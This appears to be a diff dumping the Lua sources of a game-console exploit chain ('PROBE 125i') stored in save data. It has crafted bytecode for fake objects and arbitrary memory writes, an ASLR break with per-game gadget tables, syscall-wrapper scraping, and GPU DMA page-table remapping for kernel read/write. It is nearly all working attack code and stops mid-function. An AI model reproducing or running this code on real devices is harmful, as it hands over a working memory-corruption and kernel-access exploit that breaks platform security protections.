@@ -1,0 +1,965 @@
+=== PROBE 125i: ALL SOURCES ===
+--- /savedata0/lua.lua (16211 bytes) ---
+
+--
+-- lua class
+--
+-- provide read and limited write primitives
+--
+
+lua_types = {
+    LUA_TNIL = 0,
+    LUA_TBOOLEAN = 1,
+    LUA_TLIGHTUSERDATA = 2,
+    LUA_TNUMBER = 3,
+    LUA_TSTRING = 4,
+    LUA_TTABLE = 5,
+    LUA_TFUNCTION = 6,
+    LUA_TUSERDATA = 7,
+    LUA_TTHREAD = 8
+}
+
+fakeobj_lclosure_bc = [[
+    1b4c756151000104080408000b0000000000000040626367656e2e6c756100430000005100000000
+    01000407000000a400000000000001000000009c808000c10000009e0080011e0080000100000003
+    0000000000e494400100000000000000000000004500000050000000020000020700000024000000
+    04000000040080001c408000010000001e0000011e00800001000000030000000000004540010000
+    0000000000000000004600000049000000020000020300000004008000080000001e008000000000
+    00000000000300000048000000480000004900000000000000020000000700000000000000746172
+    676574000800000000000000636c6f73757265000700000049000000490000004900000049000000
+    4d0000004d0000005000000000000000020000000700000000000000746172676574000800000000
+    000000636c6f73757265000700000050000000500000005000000050000000500000005000000051
+    000000020000000800000000000000636c6f73757265000000000006000000070000000000000074
+    617267657400000000000600000000000000
+]]
+
+write_upval_bc = [[
+    1b4c756151000104080408000b0000000000000040626367656e2e6c756100550000006000000000
+    02000606000000e4000000000080010001000040018000dc4080011e008000000000000100000000
+    00000000000000570000005f0000000102000406000000a400000004000000c00000009c40000148
+    0000001e00800000000000010000000000000000000000580000005b000000010100020200000008
+    0000001e0080000000000000000000020000005a0000005b00000001000000080000000000000063
+    6c6f7375726500000000000100000001000000070000000000000074617267657400060000005b00
+    00005b0000005b0000005b0000005e0000005f000000020000000800000000000000636c6f737572
+    65000000000005000000060000000000000076616c75650000000000050000000100000007000000
+    0000000074617267657400060000005f0000005f0000005f0000005f0000005f0000006000000003
+    0000000800000000000000636c6f73757265000000000005000000060000000000000076616c7565
+    000000000005000000070000000000000074617267657400000000000500000000000000
+]]
+
+
+
+lua = {}
+
+function lua.setup_primitives()
+    
+    -- evil bytecodes
+    lua.fakeobj_closure = load_bytecode(fakeobj_lclosure_bc)
+    lua.write_upval = load_bytecode(write_upval_bc)
+
+    lua.setup_initial_read_primitive()  -- one small step
+    lua.resolve_address()  -- break aslr and resolve offsets
+    lua.setup_victim_table()  -- setup better addrof primitive  
+end
+
+-- allocate a limited length string with a known address
+function lua.create_str_hacky(data)
+
+    assert(#data <= 39)
+    
+    local prev_t1, prev_t2 = {}, {}
+    local str, addr = nil, nil
+
+    for i=1,16 do
+        collectgarbage()
+        local t = {}
+        local l, s = nil, nil
+
+        if i % 2 == 0 then
+            for j=1,5 do t[j] = {} end
+            s = data .. string.rep("\0", (39 - #data))
+        else
+            s = data .. string.rep("\0", (39 - #data))
+            for j=1,5 do t[j] = {} end
+        end
+
+        prev_t1[i] = lua.addrof_trivial(t[1])
+        prev_t2[i] = lua.addrof_trivial(t[2])
+        
+        if i >= 3 then
+            if prev_t1[i-1] == prev_t1[i-2] then
+                str, addr = s, prev_t1[i-1]
+                break
+            elseif prev_t2[i-1] == prev_t2[i-2] then
+                str, addr = s, prev_t2[i-1]
+                break
+            end
+        end
+    end
+
+    if not (str and addr) then
+        error("failed to leak string addr")
+    end
+
+    return str, addr
+end
+
+str_hacky_list = {}
+
+function lua.create_str(str)
+    local addr = lua.addrof(str)
+    if not addr then
+        str, addr = lua.create_str_hacky(str)
+        table.insert(str_hacky_list, str)  -- prevent gc from freeing hacky str too soon
+    end
+    return str, addr+24
+end
+
+function lua.setup_initial_read_primitive()
+    
+    local fake_str_size = 0x100000001337
+
+    -- next + tt/marked/extra/padding/hash + len
+    lua.fake_str, lua.fake_str_addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(fake_str_size))
+    lua.fake_str = lua.fakeobj(lua.fake_str_addr, lua_types.LUA_TSTRING)
+
+    if bit32.band(#lua.fake_str, 0xffff) ~= 0x1337 then
+        error("failed to create fake string obj")
+    end
+end
+
+function lua.setup_better_read_primitive()
+
+    -- setup fake string at first eboot segment we can read
+    local new_fake_str_addr = eboot_addrofs.fake_string
+
+    -- if current fake str is already behind eboot segment, then do nothing
+    if new_fake_str_addr > lua.fake_str_addr then
+        return
+    end
+
+    lua.fake_str = lua.fakeobj(new_fake_str_addr, lua_types.LUA_TSTRING)
+    lua.fake_str_addr = new_fake_str_addr
+end
+
+function lua.resolve_game(luaB_auxwrap)
+    
+    print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))
+
+    local nibbles = bit64.band(luaB_auxwrap, 0xfff):tonumber()
+    print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
+    
+    game_name = games_identification[nibbles]
+
+    if not game_name then
+        errorf("unsupported game (luaB_auxwrap nibbles: %s)", hex(nibbles))
+    end
+    
+    if game_name == "RaspberryCube" then
+        print("[+] Game identified as Raspberry Cube")
+        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
+        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
+        gadgets = gadget_table.raspberry_cube.gadgets
+    elseif game_name == "Aibeya" then
+        print("[+] Game identified as Aibeya/G")
+        eboot_addrofs = gadget_table.aibeya.eboot_addrofs
+        libc_addrofs = gadget_table.aibeya.libc_addrofs
+        gadgets = gadget_table.aibeya.gadgets
+    elseif game_name == "Aikagi2" then
+        print("[+] Game identified as Aikagi 2")
+        eboot_addrofs = gadget_table.aikagi_2.eboot_addrofs
+        libc_addrofs = gadget_table.aikagi_2.libc_addrofs
+        gadgets = gadget_table.aikagi_2.gadgets
+    elseif game_name == "HamidashiCreative" then
+        print("[+] Game identified as Hamidashi Creative")
+        eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
+        libc_addrofs = gadget_table.hamidashi_creative.libc_addrofs
+        gadgets = gadget_table.hamidashi_creative.gadgets
+    elseif game_name == "AikagiKimiIsshoniPack" then
+        print("[+] Game identified as Aikagi Kimi to Issho ni Pack")
+        eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
+        libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
+        gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
+    elseif game_name == "C" then -- TODO: Test
+        print("[+] Game identified as C/D")
+        eboot_addrofs = gadget_table.c.eboot_addrofs
+        libc_addrofs = gadget_table.c.libc_addrofs
+        gadgets = gadget_table.c.gadgets
+    elseif game_name == "WinterGuest" then
+        print("[+] Game identified as WinterGuest")
+        eboot_addrofs = gadget_table.winter_guest.eboot_addrofs
+        libc_addrofs = gadget_table.winter_guest.libc_addrofs
+        gadgets = gadget_table.winter_guest.gadgets
+    elseif game_name == "IxSHETell" then
+        print("[+] Game identified as IxSHE Tell")
+        eboot_addrofs = gadget_table.ixshe_tell.eboot_addrofs
+        libc_addrofs = gadget_table.ixshe_tell.libc_addrofs
+        gadgets = gadget_table.ixshe_tell.gadgets
+    elseif game_name == "NoraPrincess" then
+        print("[+] Game identified as CUSA13303 Nora Princess and Stray Cat Heart HD")
+        eboot_addrofs = gadget_table.nora_princess.eboot_addrofs
+        libc_addrofs = gadget_table.nora_princess.libc_addrofs
+        gadgets = gadget_table.nora_princess.gadgets
+    elseif game_name == "JinkiResurrection" then
+        print("[+] Game identified as Jinki Resurrection")
+        eboot_addrofs = gadget_table.jinki_resurrection.eboot_addrofs
+        libc_addrofs = gadget_table.jinki_resurrection.libc_addrofs
+        gadgets = gadget_table.jinki_resurrection.gadgets
+    elseif game_name == "FuyuKiss" then
+        print("[+] Game identified as Fuyu Kiss")
+        eboot_addrofs = gadget_table.fuyu_kiss.eboot_addrofs
+        libc_addrofs = gadget_table.fuyu_kiss.libc_addrofs
+        gadgets = gadget_table.fuyu_kiss.gadgets
+    elseif game_name == "NoraPrincess2" then
+        print("[+] Game identified as CUSA13586 Nora Princess and Crying Cat")
+        eboot_addrofs = gadget_table.nora_princess2.eboot_addrofs
+        libc_addrofs = gadget_table.nora_princess2.libc_addrofs
+        gadgets = gadget_table.nora_princess2.gadgets
+    elseif game_name == "F" then
+        print("[+] Game identified as F")
+        eboot_addrofs = gadget_table.f.eboot_addrofs
+        libc_addrofs = gadget_table.f.libc_addrofs
+        gadgets = gadget_table.f.gadgets
+    elseif game_name == "SnowDrop" then
+        print("[+] Game identified as Snow Drop")
+        eboot_addrofs = gadget_table.snow_drop.eboot_addrofs
+        libc_addrofs = gadget_table.snow_drop.libc_addrofs
+        gadgets = gadget_table.snow_drop.gadgets
+    elseif game_name == "Mikagami" then
+        print("[+] Game identified as Mikagami")
+        eboot_addrofs = gadget_table.mikagami.eboot_addrofs
+        libc_addrofs = gadget_table.mikagami.libc_addrofs
+        gadgets = gadget_table.mikagami.gadgets
+    end
+end
+
+function lua.resolve_libc_clash_game_by_name(game_name)
+    if game_name == "Aikagi2" then
+        print("[+] Game reidentified as Aikagi 2")
+        libc_addrofs = gadget_table.aikagi_2.libc_addrofs
+    elseif game_name == "F" then
+        print("[+] Game reidentified as F")
+        libc_addrofs = gadget_table.f.libc_addrofs
+    end
+end
+
+function lua.resolve_address()
+
+    local luaB_auxwrap = nil
+    local consume = {}
+    
+    for i=1,1024 do
+
+        local co = coroutine.wrap(function() end)
+        consume[i] = co
+
+        -- read f field of CClosure (luaB_auxwrap)
+        local addr = memory.read_qword(lua.addrof(co)+0x20)
+        if addr then
+            -- calculate eboot base from luaB_auxwrap offset
+            luaB_auxwrap = addr
+            break
+        end
+    end
+    
+    if not luaB_auxwrap then
+        error("failed to leak luaB_auxwrap")
+    end
+    
+    lua.resolve_game(luaB_auxwrap)
+    
+    eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
+
+    print("[+] eboot base @ " .. hex(eboot_base))
+
+    -- resolve offsets to their address
+    for k,v in pairs(gadgets) do
+        if k == "stack_pivot" then
+            local list = {}
+            for name, offset in pairs(v) do
+                local info = {}
+                info.gadget_addr = eboot_base + offset
+                info.pivot_addr = uint64(name:match("(0x%x+)"))
+                info.pivot_base = bit64.band(info.pivot_addr, bit64.bnot(0xfff))
+                table.insert(list, info)
+            end
+            gadgets[k] = list
+        else
+            gadgets[k] = eboot_base + v
+        end
+    end
+
+    for k,offset in pairs(eboot_addrofs) do 
+        eboot_addrofs[k] = eboot_base + offset 
+    end
+	
+    -- setup fake string that can read more memory space
+    lua.setup_better_read_primitive()
+
+    -- resolve libc
+    libc_base = memory.read_qword(eboot_addrofs.strerror_import) - libc_addrofs.strerror
+    print("[+] libc base @ " .. hex(libc_base))
+
+    -- calculate libc hash, can be changed to hashing higher addresses if needed later.
+    local byte_array = memory.read_buffer(libc_base, 0xFF)
+    local hash = crc32(byte_array)
+    print("[+] libc hash @ " .. hex(hash))
+
+    -- resolve clashes if any
+    if libc_addrofs.clash and libc_addrofs.clash == 0x1 then
+        print("[+] detected clash, resolving...")
+        local orig_game_name = game_name
+        game_name = libc_identification[hash]
+        if game_name then
+            lua.resolve_libc_clash_game_by_name(game_name)
+        else
+            errorf("unsupported game (libc hash: %s for parent %s)", hex(hash), orig_game_name)
+        end
+    end
+
+    for k,offset in pairs(libc_addrofs) do 
+        libc_addrofs[k] = libc_base + offset 
+    end
+end
+
+-- setup a table where we can read its array buffer
+function lua.setup_victim_table()
+    local t = { 1, 2, 3, 4 }
+    local array_addr = memory.read_qword(lua.addrof(t)+24)
+    if array_addr then
+        if memory.read_buffer(array_addr, 1) then  -- test if we can read the buffer
+            lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
+        end
+    end
+    if not (lua.tbl_victim and lua.tbl_victim_array_addr) then
+        error("failed to find victim table")
+    end
+end
+
+function lua.get_table_value(obj)
+    if not lua.tbl_victim then return nil end
+    lua.tbl_victim[1] = obj
+    return memory.read_qword(lua.tbl_victim_array_addr)
+end
+
+function lua.fake_table_value(obj_addr, ttype)
+    if not lua.tbl_victim then return nil end
+    memory.write_qword(lua.tbl_victim_array_addr + 0x20, obj_addr)
+    memory.write_qword(lua.tbl_victim_array_addr + 0x28, ttype)
+    return lua.tbl_victim[3]
+end
+
+function lua.fakeobj_through_closure(obj_addr, ttype)
+    local addr, fake_tvalues, fake_proto, fake_closure
+    fake_tvalues, addr = lua.create_str(ub8(obj_addr) .. ub8(ttype))  -- value + ttype
+    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
+    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
+    return lua.fakeobj_closure(fake_closure)
+end
+
+function lua.addrof_trivial(x)
+    local addr = tostring(x):match("^%a+:? 0?x?%(?(%x+)%)?$")
+    return addr and uint64("0x" .. addr) or nil
+end
+
+function lua.addrof(obj)
+    return lua.get_table_value(obj) or lua.addrof_trivial(obj)
+end
+
+function lua.resolve_value(v)
+    if type(v) == "string" then
+        return lua.addrof(v)+24
+    elseif type(v) == "number" then
+        return uint64(v)
+    elseif is_uint64(v) then
+        return v
+    end
+    errorf("lua.resolve_value: invalid type (%s)", type(v))
+end
+
+function lua.fakeobj(obj_addr, ttype)
+    return lua.fake_table_value(obj_addr, ttype) or lua.fakeobj_through_closure(obj_addr, ttype)
+end
+
+function lua.read_buffer(addr, size)
+    if not lua.fake_str then return nil end
+    size = uint64(size):tonumber()
+    -- check if addr to read is after fake string addr
+    local rel_addr = (uint64(addr) - (lua.fake_str_addr + 23)):tonumber()
+    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil 
+end
+
+-- write 8 bytes (double) at target address with 4 bytes corruption after addr+8
+function lua.write_double(addr, value)
+    local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
+    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.resolve_value(fake_upval))  -- env + proto + upvals
+    lua.write_upval(fake_closure, value)
+end
+
+-- write 8 bytes (qword) at target address with 5 bytes corruption after addr+8
+function lua.write_qword(addr, value)
+    local setbit = bit64.lshift(1, 56)
+    value = uint64(value)
+    lua.write_double(addr, struct.unpack("<d", ub8(value + setbit)))
+    lua.write_double(addr+1, struct.unpack("<d", ub8(bit64.rshift(value, 8) + setbit)))
+end
+
+function lua.create_fake_cclosure(addr)
+    
+    -- next + tt/marked/isC/nupvalues/hole + gclist + env + f
+    local fake_cclosure = ub8(0) .. "\6\0\1\0\0\0\0\0" .. ub8(0) .. ub8(0) .. ub8(addr)
+
+    -- create a copy so gc wont freed the memory backing of the object
+    local mem = memory.alloc(#fake_cclosure)
+    memory.memcpy(mem, lua.resolve_value(fake_cclosure), #fake_cclosure)
+
+    return lua.fakeobj(mem, lua_types.LUA_TFUNCTION)
+end
+
+
+--
+-- bump allocator class
+--
+-- provide initial memory allocation which is backed by lua string
+--
+
+bump = {}
+
+bump.pool_size = 512 * 1024  -- 512 kb
+
+function bump.init()
+    local padding = align_16(24) -- offset to data
+    bump.lua_backing = string.rep("\0", bump.pool_size + padding)
+    bump.pool_base = lua.addrof(bump.lua_backing) + padding
+    bump.pool_current = bump.pool_base
+end
+
+function bump.alloc(size)
+
+    assert(type(size) == "number")
+
+    -- init for first time
+    if not bump.pool_base then
+        bump.init()
+    end
+
+    if bump.pool_current + size >= bump.pool_base + bump.pool_size then
+        error("bump allocator exhausted")
+    end
+
+    local addr = bump.pool_current
+    bump.pool_current = bump.pool_current + size
+    return addr
+end
+
+--- /savedata0/syscall.lua (3031 bytes) ---
+
+--
+-- syscall class
+--
+-- helper for managing & resolving syscalls
+--
+
+syscall = {}
+
+function syscall.init()
+
+    syscall.collect_info()
+
+    print("[+] libkernel base @ " .. hex(libkernel_base))
+    print("[+] platform @ " .. PLATFORM)
+
+    if PLATFORM == "ps4" then  -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
+        local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
+        -- mov rax, <num>; mov r10, rcx; syscall
+        local matches = find_pattern(libkernel_text, "48 c7 c0 ? ? ? ? 49 89 ca 0f 05")
+        syscall.syscall_wrapper = {}
+        for i,offset in ipairs(matches) do
+            local num = uint64.unpack(libkernel_text:sub(offset+3, offset+6))
+            syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
+        end
+    elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
+        local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
+        syscall.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
+    else
+        errorf("invalid platform %s", PLATFORM)
+    end
+
+    syscall.do_sanity_check()
+end
+
+function syscall.collect_info()
+
+    -- ref: https://github.com/shadps4-emu/shadPS4/blob/0bdd21b4e49c25955b16a3651255381b4a60f538/src/core/module.h#L32
+    local INIT_PROC_ADDR_OFFSET = 0x128
+    local SEGMENTS_OFFSET = 0x160
+    
+    local sceKernelGetModuleInfoFromAddr = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
+    
+    local addr_inside_libkernel = memory.read_qword(libc_addrofs.gettimeofday_import)
+    local mod_info = memory.alloc(0x300)
+
+    local ret = sceKernelGetModuleInfoFromAddr(addr_inside_libkernel, 1, mod_info):tonumber()
+    if ret ~= 0 then
+        error("sceKernelGetModuleInfoFromAddr() error: " .. hex(ret))
+    end
+    
+    libkernel_base = memory.read_qword(mod_info + SEGMENTS_OFFSET)
+
+    -- credit to flatz for this technique
+    local init_proc_addr = memory.read_qword(mod_info + INIT_PROC_ADDR_OFFSET)
+    local delta = (init_proc_addr - libkernel_base):tonumber()
+    
+    if delta == 0x0 then
+        PLATFORM = "ps4"
+    elseif delta == 0x10 then
+        PLATFORM = "ps5"
+    else
+        error("failed to determine PLATFORM")
+    end
+end
+
+function syscall.resolve(list)
+    for name, num in pairs(list) do
+        if not syscall[name] then
+            if PLATFORM == "ps4" then
+                if syscall.syscall_wrapper[num] then
+                    syscall[name] = fcall(syscall.syscall_wrapper[num], num)
+                else
+                    errorf("syscall wrapper for %s (%d) not found in libkernel", name, num)
+                end
+            elseif PLATFORM == "ps5" then
+                syscall[name] = fcall(syscall.syscall_address, num)
+            end
+        end
+    end
+end
+
+function syscall.do_sanity_check()
+
+    syscall.resolve({
+        getpid = 20,
+    })
+
+    local pid = syscall.getpid()
+    if not (pid and pid.h == 0 and pid.l ~= 0) then
+        error("syscall test failed")
+    end
+end
+
+--- /savedata0/gpu.lua (12553 bytes) ---
+
+-- credit to flatz and shadPS4 project for references
+
+-- gpu page table
+
+GPU_PDE_SHIFT = {
+    VALID = 0,
+    IS_PTE = 54,
+    TF = 56,
+    BLOCK_FRAGMENT_SIZE = 59,
+}
+
+GPU_PDE_MASKS = {
+    VALID = 1,
+    IS_PTE = 1,
+    TF = 1,
+    BLOCK_FRAGMENT_SIZE = 0x1f,
+}
+
+GPU_PDE_ADDR_MASK = uint64("0x0000ffffffffffc0")
+
+function gpu_pde_field(pde, field)
+    local shift = GPU_PDE_SHIFT[field]
+    local mask = GPU_PDE_MASKS[field]
+    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
+end
+
+function gpu_walk_pt(vmid, virt_addr)
+
+    local pdb2_addr = get_pdb2_addr(vmid)
+
+    local pml4e_index = bit64.band(bit64.rshift(virt_addr, 39), 0x1ff)
+    local pdpe_index = bit64.band(bit64.rshift(virt_addr, 30), 0x1ff)
+    local pde_index = bit64.band(bit64.rshift(virt_addr, 21), 0x1ff)
+
+    -- PDB2
+
+    local pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8)
+
+    if gpu_pde_field(pml4e, "VALID") ~= 1 then
+        return nil
+    end
+
+    -- PDB1
+
+    local pdp_base_pa = bit64.band(pml4e, GPU_PDE_ADDR_MASK)
+    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
+    local pdpe = kernel.read_qword(pdpe_va)
+
+    if gpu_pde_field(pdpe, "VALID") ~= 1 then
+        return nil
+    end
+
+    -- PDB0
+
+    local pd_base_pa = bit64.band(pdpe, GPU_PDE_ADDR_MASK)
+    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
+    local pde = kernel.read_qword(pde_va)
+
+    if gpu_pde_field(pde, "VALID") ~= 1 then
+        return nil
+    end
+
+    if gpu_pde_field(pde, "IS_PTE") == 1 then
+        return pde_va, 0x200000  -- 2mb 
+    end
+
+    -- PTB
+
+    local fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE")
+    local offset = bit64.band(virt_addr, 0x1fffff)
+    local pt_base_pa = bit64.band(pde, GPU_PDE_ADDR_MASK)
+
+    local pte_index, pte
+    local pte_va, page_size
+    
+    if fragment_size == 4 then
+        pte_index = bit64.rshift(offset, 16)
+        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
+        pte = kernel.read_qword(pte_va)
+
+        if gpu_pde_field(pte, "VALID") == 1 and gpu_pde_field(pte, "TF") == 1 then
+            pte_index = bit64.rshift(bit64.band(virt_addr, 0xffff), 13)
+            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
+            page_size = 0x2000 -- 8kb
+        else
+            page_size = 0x10000 -- 64kb
+        end
+
+    elseif fragment_size == 1 then
+        pte_index = bit64.rshift(offset, 13)
+        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
+        page_size = 0x2000 -- 8kb
+    end
+
+    return pte_va, page_size
+end
+
+
+
+
+
+-- kernel r/w primitives based on GPU DMA
+
+gpu = {}
+
+gpu.dmem_size = 2 * 0x100000 -- 2mb
+
+function gpu.setup()
+
+    check_kernel_rw()
+
+    local libSceGnmDriver = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
+
+    -- put these into global to make life easier
+    sceKernelAllocateMainDirectMemory = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory"))
+    sceKernelMapDirectMemory = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"))
+    sceGnmSubmitCommandBuffers = fcall(dlsym(libSceGnmDriver.handle, "sceGnmSubmitCommandBuffers"))
+    sceGnmSubmitDone = fcall(dlsym(libSceGnmDriver.handle, "sceGnmSubmitDone"))
+
+    local prot_ro = bit32.bor(PROT_READ, PROT_WRITE, GPU_READ)
+    local prot_rw = bit32.bor(prot_ro, GPU_WRITE)
+
+    local victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE) 
+    local transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
+    local cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE)
+
+    local curproc_cr3 = get_proc_cr3(kernel.addr.curproc)
+    local victim_real_pa = virt_to_phys(victim_va, curproc_cr3)
+
+    local victim_ptbe_va, page_size = get_ptb_entry_of_relative_va(victim_va)
+
+    if not victim_ptbe_va or page_size ~= gpu.dmem_size then
+        error("failed to setup gpu primitives")
+    end
+
+    if syscall.mprotect(victim_va, gpu.dmem_size, prot_ro):tonumber() == -1 then
+        error("mprotect() error: " .. get_error_string())
+    end
+
+    local initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va)
+    local cleared_victim_ptbe_for_ro = bit64.band(initial_victim_ptbe_for_ro, bit64.bnot(victim_real_pa))
+
+    -- printf("victim va %s real pa %s", hex(victim_va), hex(victim_real_pa))
+    -- printf("ptb entry %s page size %s", hex(victim_ptbe_va), hex(page_size))    
+    -- printf("ptbe RO. initial %s cleared %s", hex(initial_victim_ptbe_for_ro), hex(cleared_victim_ptbe_for_ro))
+
+    gpu.victim_va = victim_va
+    gpu.transfer_va = transfer_va
+    gpu.cmd_va = cmd_va
+    gpu.victim_ptbe_va = victim_ptbe_va
+    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro
+end
+
+function gpu.pm4_type3_header(opcode, count)
+    
+    assert(type(opcode) == "number")
+    assert(type(count) == "number")
+
+    local packet_type = 3
+    local shader_type = 1   -- computer shader
+    local predicate = 0     -- predicate disable
+    
+    return bit32.bor(
+        bit32.band(predicate, 0x0),                      -- Predicated version of packet when set
+        bit32.lshift(bit32.band(shader_type, 0x1), 1),   -- 0: Graphics, 1: Compute Shader
+        bit32.lshift(bit32.band(opcode, 0xff), 8),       -- IT opcode
+        bit32.lshift(bit32.band(count - 1, 0x3fff), 16), -- Number of DWORDs - 1 in the information body
+        bit32.lshift(bit32.band(packet_type, 0x3), 30)   -- Packet identifier. It should be 3 for type 3 packets
+    )
+end
+
+function gpu.pm4_dma_data(dest_va, src_va, length)
+
+    local count = 6
+    local bufsize = 4 * (count + 1)
+    local opcode = 0x50
+    local command_len = bit32.band(length, 0x1fffff)
+
+    local pm4 = memory.alloc(bufsize)
+    local dma_data_header = bit32.bor(
+        bit32.band(0, 0x1),                    -- engine
+        bit32.lshift(bit32.band(0, 0x1), 12),  -- src_atc
+        bit32.lshift(bit32.band(2, 0x3), 13),  -- src_cache_policy
+        bit32.lshift(bit32.band(1, 0x1), 15),  -- src_volatile
+        bit32.lshift(bit32.band(0, 0x3), 20),  -- dst_sel (DmaDataDst enum)
+        bit32.lshift(bit32.band(0, 0x1), 24),  -- dst_atc
+        bit32.lshift(bit32.band(2, 0x3), 25),  -- dst_cache_policy
+        bit32.lshift(bit32.band(1, 0x1), 27),  -- dst_volatile
+        bit32.lshift(bit32.band(0, 0x3), 29),  -- src_sel (DmaDataSrc enum)
+        bit32.lshift(bit32.band(1, 0x1), 31)   -- cp_sync
+    )
+
+    memory.write_dword(pm4, gpu.pm4_type3_header(opcode, count)) -- pm4 header
+    memory.write_dword(pm4 + 0x4, dma_data_header) -- dma data header (copy: mem -> mem)
+    memory.write_dword(pm4 + 0x8, src_va.l)
+    memory.write_dword(pm4 + 0xc, src_va.h)
+    memory.write_dword(pm4 + 0x10, dest_va.l)
+    memory.write_dword(pm4 + 0x14, dest_va.h)
+    memory.write_dword(pm4 + 0x18, command_len)
+
+    return memory.read_buffer(pm4, bufsize)
+end
+
+function gpu.submit_dma_data_command(dest_va, src_va, size)
+
+    local dcb_count = 1
+    local dcb_gpu_addr = memory.alloc(dcb_count * 0x8)
+    local dcb_sizes_in_bytes = memory.alloc(dcb_count * 0x4)
+
+    -- prep command buf
+    local dma_data = gpu.pm4_dma_data(dest_va, src_va, size)
+    memory.write_buffer(gpu.cmd_va, dma_data) -- prep dma cmd
+
+    -- prep param
+    memory.write_qword(dcb_gpu_addr, gpu.cmd_va)
+    memory.write_dword(dcb_sizes_in_bytes, #dma_data)
+
+    -- submit to gpu
+    local ret = sceGnmSubmitCommandBuffers(dcb_count, dcb_gpu_addr, dcb_sizes_in_bytes, 0, 0):tonumber()
+    if ret ~= 0 then
+        errorf("sceGnmSubmitCommandBuffers() error: %s", hex(ret))
+    end
+
+    -- sleep for a while
+    -- sleep(1)
+
+    -- inform gpu that current submission is done
+    ret = sceGnmSubmitDone():tonumber()
+    if ret ~= 0 then
+        errorf("sceGnmSubmitDone() error: %s", hex(ret))
+    end
+end
+
+function gpu.transfer_physical_buffer(phys_addr, size, is_write)
+
+    local trunc_phys_addr = bit64.band(phys_addr, bit64.bnot(gpu.dmem_size - 1))
+    local offset = phys_addr - trunc_phys_addr
+
+    if (offset:tonumber() + size > gpu.dmem_size) then
+        error("error: trying to write more than direct memory size: " .. size)
+    end
+
+    local prot_ro = bit32.bor(PROT_READ, PROT_WRITE, GPU_READ)
+    local prot_rw = bit32.bor(prot_ro, GPU_WRITE)
+    
+    -- remap PTD
+
+    if syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_ro):tonumber() == -1 then
+        error("mprotect() error: " .. get_error_string())
+    end
+
+    local new_ptb = bit64.bor(gpu.cleared_victim_ptbe_for_ro, trunc_phys_addr)
+    kernel.write_qword(gpu.victim_ptbe_va, new_ptb)
+
+    if syscall.mprotect(gpu.victim_va, gpu.dmem_size, prot_rw):tonumber() == -1 then
+        error("mprotect() error: " .. get_error_string())
+    end
+
+    local src, dst
+
+    if is_write then
+        src = gpu.transfer_va
+        dst = gpu.victim_va + offset
+    else
+        src = gpu.victim_va + offset
+        dst = gpu.transfer_va
+    end
+
+    -- do the DMA operation
+    gpu.submit_dma_data_command(dst, src, size)
+end
+
+function gpu.read_buffer(addr, size)
+
+    local phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3)
+    if not phys_addr then
+        errorf("failed to translate %s to physical addr", hex(addr))
+    end
+
+    gpu.transfer_physical_buffer(phys_addr, size, false)
+    return memory.read_buffer(gpu.transfer_va, size)
+end
+
+function gpu.write_buffer(addr, buf)
+
+    local phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3)
+    if not phys_addr then
+        errorf("failed to translate %s to physical addr", hex(addr))
+    end
+
+    memory.write_buffer(gpu.transfer_va, buf) -- prepare data for write
+    gpu.transfer_physical_buffer(phys_addr, #buf, true)
+end
+
+function gpu.read_byte(kaddr)
+    local value = gpu.read_buffer(kaddr, 1)
+    return value and #value == 1 and uint64.unpack(value) or nil 
+end
+
+function gpu.read_word(kaddr)
+    local value = gpu.read_buffer(kaddr, 2)
+    return value and #value == 2 and uint64.unpack(value) or nil 
+end
+
+function gpu.read_dword(kaddr)
+    local value = gpu.read_buffer(kaddr, 4)
+    return value and #value == 4 and uint64.unpack(value) or nil 
+end
+
+function gpu.read_qword(kaddr)
+    local value = gpu.read_buffer(kaddr, 8)
+    return value and #value == 8 and uint64.unpack(value) or nil 
+end
+
+function gpu.hex_dump(kaddr, size)
+    size = size or 0x40
+    return hex_dump(gpu.read_buffer(kaddr, size), kaddr)
+end
+
+function gpu.write_byte(dest, value)
+    gpu.write_buffer(dest, ub8(value):sub(1,1))
+end
+
+function gpu.write_word(dest, value)
